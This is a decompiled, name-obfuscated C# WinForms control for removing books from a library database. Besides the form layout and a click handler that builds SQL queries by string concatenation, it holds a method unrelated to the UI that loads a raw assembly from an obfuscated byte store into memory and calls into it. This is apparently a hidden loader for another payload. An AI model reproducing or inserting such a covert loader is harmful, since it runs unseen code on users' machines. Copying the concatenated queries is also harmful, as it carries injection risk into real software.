using System;
using System.ComponentModel;
using System.Data.OleDb;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Fr1;
using Microsoft.VisualBasic.CompilerServices;
using Pr90;
using p0P5;
using t0B;

namespace Sj1c;

[DesignerGenerated]
public class Tb5r : UserControl
{
	private IContainer components;

	private Button _issueButton;

	internal TextBox k;

	public Tb5r()
	{
		Mp25();
	}

	protected override void a6A2(bool Zo6m)
	{
		try
		{
			if (Zo6m && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((ContainerControl)this).Dispose(Zo6m);
		}
	}

	private void Mp25()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		Fr2k(new Button());
		Ng0n(new TextBox());
		Label val = new Label();
		((Control)this).SuspendLayout();
		((ButtonBase)Lc15()).set_BackColor(Color.MediumSeaGreen);
		((Control)Lc15()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Lc15()).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Lc15()).set_FlatStyle((FlatStyle)1);
		((Control)Lc15()).set_Font(new Font("Times New Roman", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Lc15()).set_ForeColor(Color.White);
		((Control)Lc15()).set_Location(new Point(648, 314));
		((Control)Lc15()).set_Margin(new Padding(2));
		((Control)Lc15()).set_Name("issueButton");
		((Control)Lc15()).set_Size(new Size(225, 42));
		((Control)Lc15()).set_TabIndex(14);
		((ButtonBase)Lc15()).set_Text("Remove");
		((ButtonBase)Lc15()).set_UseVisualStyleBackColor(false);
		val.set_AutoSize(true);
		((Control)val).set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)val).set_Location(new Point(169, 326));
		((Control)val).set_Margin(new Padding(2, 0, 2, 0));
		((Control)val).set_Name("AccNoLabel");
		((Control)val).set_Size(new Size(63, 19));
		((Control)val).set_TabIndex(12);
		val.set_Text("Book Id:");
		((Control)k0L6()).set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)k0L6()).set_Location(new Point(302, 323));
		((Control)k0L6()).set_Margin(new Padding(2));
		((Control)k0L6()).set_Name("AccNoTextBox");
		((Control)k0L6()).set_Size(new Size(251, 26));
		((Control)k0L6()).set_TabIndex(13);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)Lc15());
		((Control)this).get_Controls().Add((Control)(object)val);
		((Control)this).get_Controls().Add((Control)(object)k0L6());
		((Control)this).set_Name("RemoveBook");
		((Control)this).set_Size(new Size(1017, 681));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Lc15()
	{
		return _issueButton;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fr2k(Button c2DJ)
	{
		EventHandler eventHandler = n1QT;
		Button issueButton = _issueButton;
		if (issueButton != null)
		{
			((Control)issueButton).remove_Click(eventHandler);
		}
		_issueButton = c2DJ;
		issueButton = _issueButton;
		if (issueButton != null)
		{
			((Control)issueButton).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox k0L6()
	{
		return k;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ng0n(TextBox Po5i)
	{
		TextBox val = (k = Po5i);
	}

	private void n1QT(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Expected O, but got Unknown
		//IL_0219: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(k0L6().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Enter correct credentials");
			return;
		}
		if (!Regex.IsMatch(k0L6().get_Text(), "^[0-9]+$"))
		{
			MessageBox.Show("Enter correct Book id");
			return;
		}
		string connectionString = m2A.Forms.At0().connectionString;
		OleDbConnection val = new OleDbConnection(connectionString);
		string text = ("select * from Borrowed where AccNo = " + k0L6().get_Text()) ?? "";
		OleDbCommand val2 = new OleDbCommand(text, val);
		val.Open();
		OleDbDataReader val3 = val2.ExecuteReader();
		val3.Read();
		if (!val3.get_HasRows())
		{
			MessageBox.Show("Book does not exist");
			return;
		}
		if (Conversions.ToBoolean(val3.get_Item("IsIssued")))
		{
			MessageBox.Show("This Book is issued to someone");
			k0L6().set_Text("");
			return;
		}
		string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"select * from Books where ISBN='", val3.get_Item("ISBN")), (object)"'"));
		OleDbCommand val4 = new OleDbCommand(text2, val);
		OleDbDataReader val5 = val4.ExecuteReader();
		val5.Read();
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"update Books set Remaining=", Operators.SubtractObject(val5.get_Item("Remaining"), (object)1)), (object)", Total = "), Operators.SubtractObject(val5.get_Item("Total"), (object)1)), (object)" where ISBN='"), val3.get_Item("ISBN")), (object)"'"));
		OleDbCommand val6 = new OleDbCommand(text, val);
		val6.set_CommandText(text);
		val6.ExecuteScalar();
		val5.Close();
		val3.Close();
		val2.set_CommandText(("delete * from Borrowed where AccNo = " + k0L6().get_Text()) ?? "");
		val2.ExecuteScalar();
		k0L6().set_Text("");
		MessageBox.Show("Book Deleted");
		val.Close();
	}

	internal static void Pj89()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])w0T.mDic[w0T.mArray];
		assembly = Assembly.Load(rawAssembly);
		w0T.mDic.Add("Deep", assembly);
		assembly = null;
		if (Xq7o.r5Y0())
		{
			Zx0d.Pj0t();
		}
	}
}
